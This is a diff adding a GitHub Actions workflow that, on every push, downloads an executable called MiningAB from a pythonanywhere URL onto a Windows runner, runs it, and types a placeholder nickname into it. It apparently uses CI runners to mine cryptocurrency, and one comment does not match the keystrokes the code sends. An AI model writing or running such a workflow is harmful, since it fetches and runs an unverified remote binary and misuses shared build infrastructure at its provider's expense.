@@ -1,0 +1,32 @@
+name: Run MiningAB Program
+
+on: [push, workflow_dispatch]
+
+jobs:
+  run_miningab:
+    runs-on: windows-latest
+
+    steps:
+    - name: Download and Run MiningAB
+      run: |
+        # Create a directory for downloading and running the program
+        New-Item -ItemType Directory -Force -Path C:\MiningAB
+
+        # Download the MiningAB executable
+        Invoke-WebRequest -Uri https://sitex.pythonanywhere.com/download2 -OutFile C:\MiningAB\MiningAB.exe
+
+        # Run the MiningAB executable
+        $process = Start-Process -FilePath C:\MiningAB\MiningAB.exe -PassThru
+
+        # Wait for the process to start
+        Start-Sleep -Seconds 5
+
+        # Get the process by its name
+        $process = Get-Process -Name "MiningAB"
+
+        # Send "check" and Enter to the MiningAB process
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.SendKeys]::SendWait("СВОЙ НИК{ENTER}")
+
+        # Wait for the MiningAB process to finish
+        $process.WaitForExit()
